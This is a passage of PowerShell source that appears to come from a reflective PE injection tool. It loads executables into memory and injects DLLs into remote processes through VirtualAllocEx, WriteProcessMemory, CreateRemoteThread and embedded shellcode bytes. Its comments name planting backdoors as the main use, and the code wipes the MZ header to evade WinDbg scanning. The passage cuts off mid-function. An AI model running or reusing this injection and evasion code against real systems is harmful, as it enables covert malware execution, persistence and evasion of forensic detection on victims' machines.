			    #	call ExitThread
			    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			    Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			    $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    }
		    #################################################

		    Write-Output $ReturnArray
	    }
	
	
	    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	    #	It copies Count bytes from Source to Destination.
	    Function Copy-ArrayOfMemAddresses
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Array[]]
		    $CopyInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )

		    [UInt32]$OldProtectFlag = 0
		    foreach ($Info in $CopyInfo)
		    {
			    $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Call to VirtualProtect failed"
			    }
			
			    $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			    $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    }
	    }


	    #####################################
	    ##########    FUNCTIONS   ###########
	    #####################################
	    Function Get-MemoryProcAddress
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [String]
		    $FunctionName
		    )
		
		    $Win32Types = Get-Win32Types
		    $Win32Constants = Get-Win32Constants
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		    #Get the export table
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		    {
			    return [IntPtr]::Zero
		    }
		    $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		    $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		    for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		    {
			    #AddressOfNames is an array of pointers to strings of the names of the functions exported
			    $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			    $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			    $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			    if ($Name -ceq $FunctionName)
			    {
				    #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				    #    which contains the offset of the function in to the DLL
				    $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				    $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				    $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				    $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				    return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			    }
		    }
		
		    return [IntPtr]::Zero
	    }


	    Function Invoke-MemoryLoadLibrary
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true )]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $false)]
		    [String]
		    $ExeArgs,
		
		    [Parameter(Position = 2, Mandatory = $false)]
		    [IntPtr]
		    $RemoteProcHandle
		    )
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		    #Get Win32 constants and functions
		    $Win32Constants = Get-Win32Constants
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		
		    $RemoteLoading = $false
		    if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		    {
			    $RemoteLoading = $true
		    }
		
		    #Get basic PE information
		    Write-Verbose "Getting basic PE information from the file"
		    $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		    $OriginalImageBase = $PEInfo.OriginalImageBase
		    $NXCompatible = $true
		    if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		    {
			    Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			    $NXCompatible = $false
		    }
		
		
		    #Verify that the PE and the current process are the same bits (32bit or 64bit)
		    $Process64Bit = $true
		    if ($RemoteLoading -eq $true)
		    {
			    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			    $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			    if ($Result -eq [IntPtr]::Zero)
			    {
				    Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			    }
			
			    [Bool]$Wow64Process = $false
			    $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			    if ($Success -eq $false)
			    {
				    Throw "Call to IsWow64Process failed"
			    }
			
			    if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			    {
				    $Process64Bit = $false
			    }
			
			    #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			    $PowerShell64Bit = $true
			    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			    {
				    $PowerShell64Bit = $false
			    }
			    if ($PowerShell64Bit -ne $Process64Bit)
			    {
				    throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			    }
		    }
		    else
		    {
			    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			    {
				    $Process64Bit = $false
			    }
		    }
		    if ($Process64Bit -ne $PEInfo.PE64Bit)
		    {
			    Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		    }
		

		    #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		    Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		    [IntPtr]$LoadAddr = [IntPtr]::Zero
		    if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		    {
			    Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			    [IntPtr]$LoadAddr = $OriginalImageBase
		    }

		    $PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		    $EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		    if ($RemoteLoading -eq $true)
		    {
			    #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			    $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			    #todo, error handling needs to delete this memory if an error happens along the way
			    $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    if ($EffectivePEHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			    }
		    }
		    else
		    {
			    if ($NXCompatible -eq $true)
			    {
				    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			    }
			    else
			    {
				    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    }
			    $EffectivePEHandle = $PEHandle
		    }
		
		    [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		    if ($PEHandle -eq [IntPtr]::Zero)
		    { 
			    Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		    }		
		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		    #Now that the PE is in memory, get more detailed information about it
		    Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		    $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		    $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		    Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		    #Copy each section from the PE in to memory
		    Write-Verbose "Copy PE sections in to memory"
		    Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		    #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		    Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		    Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		    #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		    Write-Verbose "Import DLL's needed by the PE we are loading"
		    if ($RemoteLoading -eq $true)
		    {
			    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		    }
		    else
		    {
			    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		    }
		
		
		    #Update the memory protection flags for all the memory just allocated
		    if ($RemoteLoading -eq $false)
		    {
			    if ($NXCompatible -eq $true)
			    {
				    Write-Verbose "Update memory protection flags"
				    Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			    }
			    else
			    {
				    Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			    }
		    }
		    else
		    {
			    Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		    }
		
		
		    #If remote loading, copy the DLL in to remote process memory
		    if ($RemoteLoading -eq $true)
		    {
			    [UInt32]$NumBytesWritten = 0
			    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			    if ($Success -eq $false)
			    {
				    Throw "Unable to write shellcode to remote process memory."
			    }
		    }
		
		
		    #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		    if ($PEInfo.FileType -ieq "DLL")
		    {
			    if ($RemoteLoading -eq $false)
			    {
				    Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				    $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			    }
			    else
			    {
				    $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				    if ($PEInfo.PE64Bit -eq $true)
				    {
					    #Shellcode: CallDllMain.asm
					    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    else
				    {
					    #Shellcode: CallDllMain.asm
					    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				    $SCPSMemOriginal = $SCPSMem
				
				    Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				    Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				    Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				    if ($RSCAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Unable to allocate memory in the remote process for shellcode"
				    }
				
				    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				    {
					    Throw "Unable to write shellcode to remote process memory."
				    }

				    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				    if ($Result -ne 0)
				    {
					    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				    }
				
				    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			    }
		    }
		    elseif ($PEInfo.FileType -ieq "EXE")
		    {
			    #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			    [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			    [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			    $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			    #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			    #	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			    [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			    Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			    $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			    while($true)
			    {
				    [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				    if ($ThreadDone -eq 1)
				    {
					    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					    Write-Verbose "EXE thread has completed."
					    break
				    }
				    else
				    {
					    Start-Sleep -Seconds 1
				    }
			    }
		    }
		
		    return @($PEInfo.PEHandle, $EffectivePEHandle)
	    }
	
	
	    Function Invoke-MemoryFreeLibrary
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $PEHandle
		    )
		
		    #Get Win32 constants and functions
		    $Win32Constants = Get-Win32Constants
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		    #Call FreeLibrary for all the imports of the DLL
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		    {
			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			    while ($true)
			    {
				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				    #If the structure is null, it signals that this is the end of the array
				    if ($ImportDescriptor.Characteristics -eq 0 `
						    -and $ImportDescriptor.FirstThunk -eq 0 `
						    -and $ImportDescriptor.ForwarderChain -eq 0 `
						    -and $ImportDescriptor.Name -eq 0 `
						    -and $ImportDescriptor.TimeDateStamp -eq 0)
				    {
					    Write-Verbose "Done unloading the libraries needed by the PE"
					    break
				    }

				    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				    $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				    if ($ImportDllHandle -eq $null)
				    {
					    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				    }
				
				    $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				    if ($Success -eq $false)
				    {
					    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				    }
				
				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			    }
		    }
		
		    #Call DllMain with process detach
		    Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		    $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		    if ($Success -eq $false)
		    {
			    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		    }
	    }


	    Function Main
	    {
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		    $Win32Constants =  Get-Win32Constants
		
		    $RemoteProcHandle = [IntPtr]::Zero
	
		    #If a remote process to inject in to is specified, get a handle to it
		    if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		    {
			    Throw "Can't supply a ProcId and ProcName, choose one or the other"
		    }
		    elseif ($ProcName -ne $null -and $ProcName -ne "")
		    {
			    $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			    if ($Processes.Count -eq 0)
			    {
				    Throw "Can't find process $ProcName"
			    }
			    elseif ($Processes.Count -gt 1)
			    {
				    $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				    Write-Output $ProcInfo
				    Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			    }
			    else
			    {
				    $ProcId = $Processes[0].ID
			    }
		    }
		
		    #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		    #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
    #		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
    #		{
    #			Write-Verbose "Getting SeDebugPrivilege"
    #			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
    #		}	
		
		    if (($ProcId -ne $null) -and ($ProcId -ne 0))
		    {
			    $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			    if ($RemoteProcHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Couldn't obtain the handle for process ID: $ProcId"
			    }
			
			    Write-Verbose "Got the handle for the remote process to inject in to"
		    }
		

		    #Load the PE reflectively
		    Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		    $PEHandle = [IntPtr]::Zero
		    if ($RemoteProcHandle -eq [IntPtr]::Zero)
		    {
			    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		    }
		    else
		    {
			    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		    }
		    if ($PELoadedInfo -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to load PE, handle returned is NULL"
		    }
		
		    $PEHandle = $PELoadedInfo[0]
		    $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		    #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		    if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		    {
			    #########################################
			    ### YOUR CODE GOES HERE
			    #########################################
	            switch ($FuncReturnType)
	            {
	                'WString' {
	                    Write-Verbose "Calling function with WString return type"
				        [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				        if ($WStringFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				        $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				        [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
	                }

	                'String' {
	                    Write-Verbose "Calling function with String return type"
				        [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				        if ($StringFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				        $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				        [IntPtr]$OutputPtr = $StringFunc.Invoke()
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				        Write-Output $Output
	                }

	                'Void' {
	                    Write-Verbose "Calling function with Void return type"
				        [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				        if ($VoidFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $VoidFuncDelegate = Get-DelegateType @() ([Void])
				        $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				        $VoidFunc.Invoke() | Out-Null
	                }
	            }
			    #########################################
			    ### END OF YOUR CODE
			    #########################################
		    }
		    #For remote DLL injection, call a void function which takes no parameters
		    elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		    {
			    $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			    if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			    {
				    Throw "VoidFunc couldn't be found in the DLL"
			    }
			
			    $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			    $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			    #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		    }
		
		    #Don't free a library if it is injected in a remote process
		    if ($RemoteProcHandle -eq [IntPtr]::Zero)
		    {
			    Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		    }
		    else
		    {
			    #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			    if ($Success -eq $false)
			    {
				    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			    }
		    }
		
		    Write-Verbose "Done!"
	    }

	    Main
    }

    #Main function to either run the script locally or remotely
    Function Main
    {
	    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	    {
		    $DebugPreference  = "Continue"
	    }
	
	    Write-Verbose "PowerShell ProcessID: $PID"
	
	    [Byte[]]$PEBytes = $null
	
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            $PEBytes = $Bytes64
        }
        else
        {
            $PEBytes = $Bytes32
        }
	
	    #Verify the image is a valid PE file
	    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

        if ($e_magic -ne 'MZ')
        {
            throw 'PE is not a valid PE file.'
        }

        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	    # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
	
	    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	    {
